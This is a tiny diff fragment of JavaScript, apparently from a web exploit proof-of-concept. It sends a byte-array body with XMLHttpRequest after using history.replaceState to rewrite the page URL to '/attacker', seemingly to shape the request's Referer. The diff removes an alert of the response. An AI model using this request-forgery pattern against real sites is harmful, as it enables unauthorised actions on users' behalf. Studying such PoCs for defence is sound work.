@@ -11,7 +11,6 @@ xhr.onreadystatechange = function() {
 		aBody[i] = body.charCodeAt(i);
 	window.history.replaceState(null, '', '/attacker');
 	xhr.send(new Blob([aBody]));
-	alert(xhr.responseText);
     }
 }
 
